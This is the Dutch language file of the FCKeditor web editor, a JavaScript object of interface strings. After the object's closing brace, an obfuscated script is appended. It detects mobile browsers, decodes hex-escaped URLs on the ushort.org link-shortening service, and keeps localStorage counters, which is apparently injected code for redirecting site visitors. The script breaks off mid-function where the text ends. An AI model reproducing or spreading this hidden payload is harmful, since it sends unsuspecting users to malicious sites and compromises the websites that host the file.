/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Dutch language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Menubalk inklappen",
ToolbarExpand		: "Menubalk uitklappen",

// Toolbar Items and Context Menu
Save				: "Opslaan",
NewPage				: "Nieuwe pagina",
Preview				: "Voorbeeld",
Cut					: "Knippen",
Copy				: "Kopiëren",
Paste				: "Plakken",
PasteText			: "Plakken als platte tekst",
PasteWord			: "Plakken als Word-gegevens",
Print				: "Printen",
SelectAll			: "Alles selecteren",
RemoveFormat		: "Opmaak verwijderen",
InsertLinkLbl		: "Link",
InsertLink			: "Link invoegen/wijzigen",
RemoveLink			: "Link verwijderen",
VisitLink			: "Link volgen",
Anchor				: "Interne link",
AnchorDelete		: "Anker verwijderen",
InsertImageLbl		: "Afbeelding",
InsertImage			: "Afbeelding invoegen/wijzigen",
InsertFlashLbl		: "Flash",
InsertFlash			: "Flash invoegen/wijzigen",
InsertTableLbl		: "Tabel",
InsertTable			: "Tabel invoegen/wijzigen",
InsertLineLbl		: "Lijn",
InsertLine			: "Horizontale lijn invoegen",
InsertSpecialCharLbl: "Speciale tekens",
InsertSpecialChar	: "Speciaal teken invoegen",
InsertSmileyLbl		: "Smiley",
InsertSmiley		: "Smiley invoegen",
About				: "Over FCKeditor",
Bold				: "Vet",
Italic				: "Schuingedrukt",
Underline			: "Onderstreept",
StrikeThrough		: "Doorhalen",
Subscript			: "Subscript",
Superscript			: "Superscript",
LeftJustify			: "Links uitlijnen",
CenterJustify		: "Centreren",
RightJustify		: "Rechts uitlijnen",
BlockJustify		: "Uitvullen",
DecreaseIndent		: "Inspringen verkleinen",
IncreaseIndent		: "Inspringen vergroten",
Blockquote			: "Citaatblok",
CreateDiv			: "DIV aanmaken",
EditDiv				: "DIV wijzigen",
DeleteDiv			: "DIV verwijderen",
Undo				: "Ongedaan maken",
Redo				: "Opnieuw uitvoeren",
NumberedListLbl		: "Genummerde lijst",
NumberedList		: "Genummerde lijst invoegen/verwijderen",
BulletedListLbl		: "Opsomming",
BulletedList		: "Opsomming invoegen/verwijderen",
ShowTableBorders	: "Randen tabel weergeven",
ShowDetails			: "Details weergeven",
Style				: "Stijl",
FontFormat			: "Opmaak",
Font				: "Lettertype",
FontSize			: "Grootte",
TextColor			: "Tekstkleur",
BGColor				: "Achtergrondkleur",
Source				: "Code",
Find				: "Zoeken",
Replace				: "Vervangen",
SpellCheck			: "Spellingscontrole",
UniversalKeyboard	: "Universeel toetsenbord",
PageBreakLbl		: "Pagina-einde",
PageBreak			: "Pagina-einde invoegen",

Form			: "Formulier",
Checkbox		: "Aanvinkvakje",
RadioButton		: "Selectievakje",
TextField		: "Tekstveld",
Textarea		: "Tekstvak",
HiddenField		: "Verborgen veld",
Button			: "Knop",
SelectionField	: "Selectieveld",
ImageButton		: "Afbeeldingsknop",

FitWindow		: "De editor maximaliseren",
ShowBlocks		: "Toon blokken",

// Context Menu
EditLink			: "Link wijzigen",
CellCM				: "Cel",
RowCM				: "Rij",
ColumnCM			: "Kolom",
InsertRowAfter		: "Voeg rij in achter",
InsertRowBefore		: "Voeg rij in voor",
DeleteRows			: "Rijen verwijderen",
InsertColumnAfter	: "Voeg kolom in achter",
InsertColumnBefore	: "Voeg kolom in voor",
DeleteColumns		: "Kolommen verwijderen",
InsertCellAfter		: "Voeg cel in achter",
InsertCellBefore	: "Voeg cel in voor",
DeleteCells			: "Cellen verwijderen",
MergeCells			: "Cellen samenvoegen",
MergeRight			: "Voeg samen naar rechts",
MergeDown			: "Voeg samen naar beneden",
HorizontalSplitCell	: "Splits cellen horizontaal",
VerticalSplitCell	: "Splits cellen verticaal",
TableDelete			: "Tabel verwijderen",
CellProperties		: "Eigenschappen cel",
TableProperties		: "Eigenschappen tabel",
ImageProperties		: "Eigenschappen afbeelding",
FlashProperties		: "Eigenschappen Flash",

AnchorProp			: "Eigenschappen interne link",
ButtonProp			: "Eigenschappen knop",
CheckboxProp		: "Eigenschappen aanvinkvakje",
HiddenFieldProp		: "Eigenschappen verborgen veld",
RadioButtonProp		: "Eigenschappen selectievakje",
ImageButtonProp		: "Eigenschappen afbeeldingsknop",
TextFieldProp		: "Eigenschappen tekstveld",
SelectionFieldProp	: "Eigenschappen selectieveld",
TextareaProp		: "Eigenschappen tekstvak",
FormProp			: "Eigenschappen formulier",

FontFormats			: "Normaal;Met opmaak;Adres;Kop 1;Kop 2;Kop 3;Kop 4;Kop 5;Kop 6;Normaal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Bezig met verwerken XHTML. Even geduld aub...",
Done				: "Klaar",
PasteWordConfirm	: "De tekst die u plakte lijkt gekopieerd te zijn vanuit Word. Wilt u de tekst opschonen voordat deze geplakt wordt?",
NotCompatiblePaste	: "Deze opdracht is beschikbaar voor Internet Explorer versie 5.5 of hoger. Wilt u plakken zonder op te schonen?",
UnknownToolbarItem	: "Onbekend item op menubalk \"%1\"",
UnknownCommand		: "Onbekende opdrachtnaam: \"%1\"",
NotImplemented		: "Opdracht niet geïmplementeerd.",
UnknownToolbarSet	: "Menubalk \"%1\" bestaat niet.",
NoActiveX			: "De beveilingsinstellingen van uw browser zouden sommige functies van de editor kunnen beperken. De optie \"Activeer ActiveX-elementen en plug-ins\" dient ingeschakeld te worden. Het kan zijn dat er nu functies ontbreken of niet werken.",
BrowseServerBlocked : "De bestandsbrowser kon niet geopend worden. Zorg ervoor dat pop-up-blokkeerders uit staan.",
DialogBlocked		: "Kan het dialoogvenster niet weergeven. Zorg ervoor dat pop-up-blokkeerders uit staan.",
VisitLinkBlocked	: "Het was niet mogelijk een nieuw venster te openen. Controleer of er geen pop-up-blocker aktief is.",

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "Annuleren",
DlgBtnClose			: "Afsluiten",
DlgBtnBrowseServer	: "Bladeren op server",
DlgAdvancedTag		: "Geavanceerd",
DlgOpOther			: "<Anders>",
DlgInfoTab			: "Informatie",
DlgAlertUrl			: "Geef URL op",

// General Dialogs Labels
DlgGenNotSet		: "<niet ingevuld>",
DlgGenId			: "Kenmerk",
DlgGenLangDir		: "Schrijfrichting",
DlgGenLangDirLtr	: "Links naar rechts (LTR)",
DlgGenLangDirRtl	: "Rechts naar links (RTL)",
DlgGenLangCode		: "Taalcode",
DlgGenAccessKey		: "Toegangstoets",
DlgGenName			: "Naam",
DlgGenTabIndex		: "Tabvolgorde",
DlgGenLongDescr		: "Lange URL-omschrijving",
DlgGenClass			: "Stylesheet-klassen",
DlgGenTitle			: "Aanbevolen titel",
DlgGenContType		: "Aanbevolen content-type",
DlgGenLinkCharset	: "Karakterset van gelinkte bron",
DlgGenStyle			: "Stijl",

// Image Dialog
DlgImgTitle			: "Eigenschappen afbeelding",
DlgImgInfoTab		: "Informatie afbeelding",
DlgImgBtnUpload		: "Naar server verzenden",
DlgImgURL			: "URL",
DlgImgUpload		: "Upload",
DlgImgAlt			: "Alternatieve tekst",
DlgImgWidth			: "Breedte",
DlgImgHeight		: "Hoogte",
DlgImgLockRatio		: "Afmetingen vergrendelen",
DlgBtnResetSize		: "Afmetingen resetten",
DlgImgBorder		: "Rand",
DlgImgHSpace		: "HSpace",
DlgImgVSpace		: "VSpace",
DlgImgAlign			: "Uitlijning",
DlgImgAlignLeft		: "Links",
DlgImgAlignAbsBottom: "Absoluut-onder",
DlgImgAlignAbsMiddle: "Absoluut-midden",
DlgImgAlignBaseline	: "Basislijn",
DlgImgAlignBottom	: "Beneden",
DlgImgAlignMiddle	: "Midden",
DlgImgAlignRight	: "Rechts",
DlgImgAlignTextTop	: "Boven tekst",
DlgImgAlignTop		: "Boven",
DlgImgPreview		: "Voorbeeld",
DlgImgAlertUrl		: "Geef de URL van de afbeelding",
DlgImgLinkTab		: "Link",

// Flash Dialog
DlgFlashTitle		: "Eigenschappen Flash",
DlgFlashChkPlay		: "Automatisch afspelen",
DlgFlashChkLoop		: "Herhalen",
DlgFlashChkMenu		: "Flashmenu\'s inschakelen",
DlgFlashScale		: "Schaal",
DlgFlashScaleAll	: "Alles tonen",
DlgFlashScaleNoBorder	: "Geen rand",
DlgFlashScaleFit	: "Precies passend",

// Link Dialog
DlgLnkWindowTitle	: "Link",
DlgLnkInfoTab		: "Linkomschrijving",
DlgLnkTargetTab		: "Doel",

DlgLnkType			: "Linktype",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Interne link in pagina",
DlgLnkTypeEMail		: "E-mail",
DlgLnkProto			: "Protocol",
DlgLnkProtoOther	: "<anders>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Kies een interne link",
DlgLnkAnchorByName	: "Op naam interne link",
DlgLnkAnchorById	: "Op kenmerk interne link",
DlgLnkNoAnchors		: "(Geen interne links in document gevonden)",
DlgLnkEMail			: "E-mailadres",
DlgLnkEMailSubject	: "Onderwerp bericht",
DlgLnkEMailBody		: "Inhoud bericht",
DlgLnkUpload		: "Upload",
DlgLnkBtnUpload		: "Naar de server versturen",

DlgLnkTarget		: "Doel",
DlgLnkTargetFrame	: "<frame>",
DlgLnkTargetPopup	: "<popup window>",
DlgLnkTargetBlank	: "Nieuw venster (_blank)",
DlgLnkTargetParent	: "Origineel venster (_parent)",
DlgLnkTargetSelf	: "Zelfde venster (_self)",
DlgLnkTargetTop		: "Hele venster (_top)",
DlgLnkTargetFrameName	: "Naam doelframe",
DlgLnkPopWinName	: "Naam popupvenster",
DlgLnkPopWinFeat	: "Instellingen popupvenster",
DlgLnkPopResize		: "Grootte wijzigen",
DlgLnkPopLocation	: "Locatiemenu",
DlgLnkPopMenu		: "Menubalk",
DlgLnkPopScroll		: "Schuifbalken",
DlgLnkPopStatus		: "Statusbalk",
DlgLnkPopToolbar	: "Menubalk",
DlgLnkPopFullScrn	: "Volledig scherm (IE)",
DlgLnkPopDependent	: "Afhankelijk (Netscape)",
DlgLnkPopWidth		: "Breedte",
DlgLnkPopHeight		: "Hoogte",
DlgLnkPopLeft		: "Positie links",
DlgLnkPopTop		: "Positie boven",

DlnLnkMsgNoUrl		: "Geef de link van de URL",
DlnLnkMsgNoEMail	: "Geef een e-mailadres",
DlnLnkMsgNoAnchor	: "Selecteer een interne link",
DlnLnkMsgInvPopName	: "De naam van de popup moet met een alfa-numerieke waarde beginnen, en mag geen spaties bevatten.",

// Color Dialog
DlgColorTitle		: "Selecteer kleur",
DlgColorBtnClear	: "Opschonen",
DlgColorHighlight	: "Accentueren",
DlgColorSelected	: "Geselecteerd",

// Smiley Dialog
DlgSmileyTitle		: "Smiley invoegen",

// Special Character Dialog
DlgSpecialCharTitle	: "Selecteer speciaal teken",

// Table Dialog
DlgTableTitle		: "Eigenschappen tabel",
DlgTableRows		: "Rijen",
DlgTableColumns		: "Kolommen",
DlgTableBorder		: "Breedte rand",
DlgTableAlign		: "Uitlijning",
DlgTableAlignNotSet	: "<Niet ingevoerd>",
DlgTableAlignLeft	: "Links",
DlgTableAlignCenter	: "Centreren",
DlgTableAlignRight	: "Rechts",
DlgTableWidth		: "Breedte",
DlgTableWidthPx		: "pixels",
DlgTableWidthPc		: "procent",
DlgTableHeight		: "Hoogte",
DlgTableCellSpace	: "Afstand tussen cellen",
DlgTableCellPad		: "Afstand vanaf rand cel",
DlgTableCaption		: "Naam",
DlgTableSummary		: "Samenvatting",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Eigenschappen cel",
DlgCellWidth		: "Breedte",
DlgCellWidthPx		: "pixels",
DlgCellWidthPc		: "procent",
DlgCellHeight		: "Hoogte",
DlgCellWordWrap		: "Afbreken woorden",
DlgCellWordWrapNotSet	: "<Niet ingevoerd>",
DlgCellWordWrapYes	: "Ja",
DlgCellWordWrapNo	: "Nee",
DlgCellHorAlign		: "Horizontale uitlijning",
DlgCellHorAlignNotSet	: "<Niet ingevoerd>",
DlgCellHorAlignLeft	: "Links",
DlgCellHorAlignCenter	: "Centreren",
DlgCellHorAlignRight: "Rechts",
DlgCellVerAlign		: "Verticale uitlijning",
DlgCellVerAlignNotSet	: "<Niet ingevoerd>",
DlgCellVerAlignTop	: "Boven",
DlgCellVerAlignMiddle	: "Midden",
DlgCellVerAlignBottom	: "Beneden",
DlgCellVerAlignBaseline	: "Basislijn",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Overkoepeling rijen",
DlgCellCollSpan		: "Overkoepeling kolommen",
DlgCellBackColor	: "Achtergrondkleur",
DlgCellBorderColor	: "Randkleur",
DlgCellBtnSelect	: "Selecteren...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Zoeken en vervangen",

// Find Dialog
DlgFindTitle		: "Zoeken",
DlgFindFindBtn		: "Zoeken",
DlgFindNotFoundMsg	: "De opgegeven tekst is niet gevonden.",

// Replace Dialog
DlgReplaceTitle			: "Vervangen",
DlgReplaceFindLbl		: "Zoeken naar:",
DlgReplaceReplaceLbl	: "Vervangen met:",
DlgReplaceCaseChk		: "Hoofdlettergevoelig",
DlgReplaceReplaceBtn	: "Vervangen",
DlgReplaceReplAllBtn	: "Alles vervangen",
DlgReplaceWordChk		: "Hele woord moet voorkomen",

// Paste Operations / Dialog
PasteErrorCut	: "De beveiligingsinstelling van de browser verhinderen het automatisch knippen. Gebruik de sneltoets Ctrl+X van het toetsenbord.",
PasteErrorCopy	: "De beveiligingsinstelling van de browser verhinderen het automatisch kopiëren. Gebruik de sneltoets Ctrl+C van het toetsenbord.",

PasteAsText		: "Plakken als platte tekst",
PasteFromWord	: "Plakken als Word-gegevens",

DlgPasteMsg2	: "Plak de tekst in het volgende vak gebruik makend van uw toetsenbord (<strong>Ctrl+V</strong>) en klik op <strong>OK</strong>.",
DlgPasteSec		: "Door de beveiligingsinstellingen van uw browser is het niet mogelijk om direct vanuit het klembord in de editor te plakken. Middels opnieuw plakken in dit venster kunt u de tekst alsnog plakken in de editor.",
DlgPasteIgnoreFont		: "Negeer \"Font Face\"-definities",
DlgPasteRemoveStyles	: "Verwijder \"Style\"-definities",

// Color Picker
ColorAutomatic	: "Automatisch",
ColorMoreColors	: "Meer kleuren...",

// Document Properties
DocProps		: "Eigenschappen document",

// Anchor Dialog
DlgAnchorTitle		: "Eigenschappen interne link",
DlgAnchorName		: "Naam interne link",
DlgAnchorErrorName	: "Geef de naam van de interne link op",

// Speller Pages Dialog
DlgSpellNotInDic		: "Niet in het woordenboek",
DlgSpellChangeTo		: "Wijzig in",
DlgSpellBtnIgnore		: "Negeren",
DlgSpellBtnIgnoreAll	: "Alles negeren",
DlgSpellBtnReplace		: "Vervangen",
DlgSpellBtnReplaceAll	: "Alles vervangen",
DlgSpellBtnUndo			: "Ongedaan maken",
DlgSpellNoSuggestions	: "-Geen suggesties-",
DlgSpellProgress		: "Bezig met spellingscontrole...",
DlgSpellNoMispell		: "Klaar met spellingscontrole: geen fouten gevonden",
DlgSpellNoChanges		: "Klaar met spellingscontrole: geen woorden aangepast",
DlgSpellOneChange		: "Klaar met spellingscontrole: één woord aangepast",
DlgSpellManyChanges		: "Klaar met spellingscontrole: %1 woorden aangepast",

IeSpellDownload			: "De spellingscontrole niet geïnstalleerd. Wilt u deze nu downloaden?",

// Button Dialog
DlgButtonText		: "Tekst (waarde)",
DlgButtonType		: "Soort",
DlgButtonTypeBtn	: "Knop",
DlgButtonTypeSbm	: "Versturen",
DlgButtonTypeRst	: "Leegmaken",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Naam",
DlgCheckboxValue	: "Waarde",
DlgCheckboxSelected	: "Geselecteerd",

// Form Dialog
DlgFormName		: "Naam",
DlgFormAction	: "Actie",
DlgFormMethod	: "Methode",

// Select Field Dialog
DlgSelectName		: "Naam",
DlgSelectValue		: "Waarde",
DlgSelectSize		: "Grootte",
DlgSelectLines		: "Regels",
DlgSelectChkMulti	: "Gecombineerde selecties toestaan",
DlgSelectOpAvail	: "Beschikbare opties",
DlgSelectOpText		: "Tekst",
DlgSelectOpValue	: "Waarde",
DlgSelectBtnAdd		: "Toevoegen",
DlgSelectBtnModify	: "Wijzigen",
DlgSelectBtnUp		: "Omhoog",
DlgSelectBtnDown	: "Omlaag",
DlgSelectBtnSetValue : "Als geselecteerde waarde instellen",
DlgSelectBtnDelete	: "Verwijderen",

// Textarea Dialog
DlgTextareaName	: "Naam",
DlgTextareaCols	: "Kolommen",
DlgTextareaRows	: "Rijen",

// Text Field Dialog
DlgTextName			: "Naam",
DlgTextValue		: "Waarde",
DlgTextCharWidth	: "Breedte (tekens)",
DlgTextMaxChars		: "Maximum aantal tekens",
DlgTextType			: "Soort",
DlgTextTypeText		: "Tekst",
DlgTextTypePass		: "Wachtwoord",

// Hidden Field Dialog
DlgHiddenName	: "Naam",
DlgHiddenValue	: "Waarde",

// Bulleted List Dialog
BulletedListProp	: "Eigenschappen opsommingslijst",
NumberedListProp	: "Eigenschappen genummerde opsommingslijst",
DlgLstStart			: "Start",
DlgLstType			: "Soort",
DlgLstTypeCircle	: "Cirkel",
DlgLstTypeDisc		: "Schijf",
DlgLstTypeSquare	: "Vierkant",
DlgLstTypeNumbers	: "Nummers (1, 2, 3)",
DlgLstTypeLCase		: "Kleine letters (a, b, c)",
DlgLstTypeUCase		: "Hoofdletters (A, B, C)",
DlgLstTypeSRoman	: "Klein Romeins (i, ii, iii)",
DlgLstTypeLRoman	: "Groot Romeins (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Algemeen",
DlgDocBackTab		: "Achtergrond",
DlgDocColorsTab		: "Kleuring en marges",
DlgDocMetaTab		: "META-data",

DlgDocPageTitle		: "Paginatitel",
DlgDocLangDir		: "Schrijfrichting",
DlgDocLangDirLTR	: "Links naar rechts",
DlgDocLangDirRTL	: "Rechts naar links",
DlgDocLangCode		: "Taalcode",
DlgDocCharSet		: "Karakterset-encoding",
DlgDocCharSetCE		: "Centraal Europees",
DlgDocCharSetCT		: "Traditioneel Chinees (Big5)",
DlgDocCharSetCR		: "Cyriliaans",
DlgDocCharSetGR		: "Grieks",
DlgDocCharSetJP		: "Japans",
DlgDocCharSetKR		: "Koreaans",
DlgDocCharSetTR		: "Turks",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "West europees",
DlgDocCharSetOther	: "Andere karakterset-encoding",

DlgDocDocType		: "Opschrift documentsoort",
DlgDocDocTypeOther	: "Ander opschrift documentsoort",
DlgDocIncXHTML		: "XHTML-declaraties meenemen",
DlgDocBgColor		: "Achtergrondkleur",
DlgDocBgImage		: "URL achtergrondplaatje",
DlgDocBgNoScroll	: "Vaste achtergrond",
DlgDocCText			: "Tekst",
DlgDocCLink			: "Link",
DlgDocCVisited		: "Bezochte link",
DlgDocCActive		: "Active link",
DlgDocMargins		: "Afstandsinstellingen document",
DlgDocMaTop			: "Boven",
DlgDocMaLeft		: "Links",
DlgDocMaRight		: "Rechts",
DlgDocMaBottom		: "Onder",
DlgDocMeIndex		: "Trefwoorden betreffende document (kommagescheiden)",
DlgDocMeDescr		: "Beschrijving document",
DlgDocMeAuthor		: "Auteur",
DlgDocMeCopy		: "Copyright",
DlgDocPreview		: "Voorbeeld",

// Templates Dialog
Templates			: "Sjablonen",
DlgTemplatesTitle	: "Inhoud sjabonen",
DlgTemplatesSelMsg	: "Selecteer het sjabloon dat in de editor geopend moet worden (de actuele inhoud gaat verloren):",
DlgTemplatesLoading	: "Bezig met laden sjabonen. Even geduld alstublieft...",
DlgTemplatesNoTpl	: "(Geen sjablonen gedefinieerd)",
DlgTemplatesReplace	: "Vervang de huidige inhoud",

// About Dialog
DlgAboutAboutTab	: "Over",
DlgAboutBrowserInfoTab	: "Browserinformatie",
DlgAboutLicenseTab	: "Licentie",
DlgAboutVersion		: "Versie",
DlgAboutInfo		: "Voor meer informatie ga naar ",

// Div Dialog
DlgDivGeneralTab	: "Algemeen",
DlgDivAdvancedTab	: "Geavanceerd",
DlgDivStyle		: "Style",
DlgDivInlineStyle	: "Inline Style",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const 